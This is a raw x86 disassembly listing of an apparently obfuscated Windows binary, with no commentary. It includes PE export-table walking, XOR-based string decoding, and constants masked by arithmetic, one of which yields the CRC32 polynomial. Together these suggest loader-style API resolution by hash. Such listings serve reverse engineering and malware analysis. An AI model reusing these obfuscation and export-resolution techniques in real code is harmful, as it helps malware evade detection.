  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
